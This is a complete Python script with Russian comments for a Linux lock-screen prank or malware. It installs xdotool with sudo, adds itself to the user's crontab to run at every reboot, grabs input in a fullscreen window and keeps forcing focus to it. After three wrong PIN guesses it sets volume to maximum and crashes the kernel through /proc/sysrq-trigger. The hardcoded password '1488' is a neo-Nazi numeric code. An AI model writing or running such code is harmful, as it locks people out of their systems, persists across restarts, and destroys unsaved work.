#!/usr/bin/env python3
import os, sys, time, threading, subprocess, shlex
import pygame
from pygame.locals import *

# ---------- проверка/установка xdotool ----------
def ensure_xdotool():
    try:
        subprocess.check_call(["which", "xdotool"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        print("Устанавливаю xdotool...")
        subprocess.call(["sudo", "apt", "install", "-y", "xdotool"])

ensure_xdotool()

# ---------- автозагрузка ----------
def add_to_crontab():
    script_path = os.path.abspath(__file__)
    cmd = f"@reboot /usr/bin/python3 {shlex.quote(script_path)} &"
    try:
        existing = subprocess.check_output(["crontab", "-l"], stderr=subprocess.DEVNULL).decode()
    except:
        existing = ""
    if cmd not in existing:
        with open("/tmp/crontab_new", "w") as f:
            f.write(existing.strip() + "\n" + cmd + "\n")
        subprocess.call(["crontab", "/tmp/crontab_new"])
        os.unlink("/tmp/crontab_new")
        print("[+] Добавлено в автозагрузку.")

# ---------- принудительный фокус (блокирует переключение) ----------
def force_focus():
    while True:
        # Активируем окно по имени "LOCKED"
        subprocess.call(["xdotool", "search", "--name", "LOCKED", "windowactivate"],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(0.1)

# ---------- звук (громкий крик) ----------
def play_sound():
    subprocess.run(["amixer", "set", "Master", "100%"], capture_output=True)
    subprocess.run(["aplay", "/usr/share/sounds/alsa/Front_Center.wav"], capture_output=True)

# ---------- Kernel Panic ----------
def panic():
    with open("/proc/sysrq-trigger", "w") as f:
        f.write("c")

# ---------- настройки ----------
PASSWORD = "1488"
MAX_ATTEMPTS = 3
attempts_left = MAX_ATTEMPTS
input_buffer = ""

# ---------- Pygame ----------
pygame.init()
info = pygame.display.Info()
screen = pygame.display.set_mode((info.current_w, info.current_h),
                                 pygame.FULLSCREEN | pygame.NOFRAME)
pygame.display.set_caption("LOCKED")
pygame.mouse.set_visible(False)

# Захват ввода (мышь + клавиатура) в окне
pygame.event.set_grab(True)

# Запускаем поток, который держит фокус
threading.Thread(target=force_focus, daemon=True).start()

# Шрифты
font = pygame.font.SysFont("monospace", 28, bold=True)
font_small = pygame.font.SysFont("monospace", 22)
BLACK = (0, 0, 0)
GREEN = (0, 255, 0)
RED   = (255, 0, 0)
WHITE = (255, 255, 255)

def draw():
    screen.fill(BLACK)
    txt = font.render("YOU ARE LOCKED. GUESS 4-DIGIT PASSWORD", True, GREEN)
    screen.blit(txt, (screen.get_width()//2 - txt.get_width()//2, 50))
    txt2 = font_small.render(f"ATTEMPTS LEFT: {attempts_left}", True, GREEN)
    screen.blit(txt2, (screen.get_width()//2 - txt2.get_width()//2, 100))
    stars = "*" * len(input_buffer)
    inp = font.render(f"> {stars}", True, GREEN)
    screen.blit(inp, (screen.get_width()//2 - inp.get_width()//2, 150))
    keys = ["1 2 3", "4 5 6", "7 8 9", "   0"]
    for i, row in enumerate(keys):
        txt_key = font_small.render(row, True, GREEN)
        screen.blit(txt_key, (screen.get_width()//2 - txt_key.get_width()//2, 210 + i*40))
    pygame.display.flip()

# Добавляем в автозагрузку
add_to_crontab()

# ---------- главный цикл ----------
running = True
draw()
while running:
    for event in pygame.event.get():
        if event.type == KEYDOWN:
            if event.key == K_RETURN:
                if input_buffer == PASSWORD:
                    running = False
                    pygame.quit()
                    sys.exit(0)
                else:
                    input_buffer = ""
                    attempts_left -= 1
                    if attempts_left <= 0:
                        draw()
                        threading.Thread(target=play_sound, daemon=True).start()
                        for i in range(10):
                            color = RED if i % 2 == 0 else WHITE
                            screen.fill(color)
                            pygame.display.flip()
                            time.sleep(0.1)
                        screen.fill(BLACK)
                        pygame.display.flip()
                        threading.Timer(5.0, panic).start()
                        running = False
                    else:
                        draw()
            elif event.key == K_BACKSPACE:
                input_buffer = input_buffer[:-1]
                draw()
            elif event.key in (K_0, K_1, K_2, K_3, K_4, K_5, K_6, K_7, K_8, K_9):
                if len(input_buffer) < 4:
                    input_buffer += chr(event.key)
                    draw()
        if event.type == QUIT:
            pass

# Если вышли – висеть
while True:
    time.sleep(1)
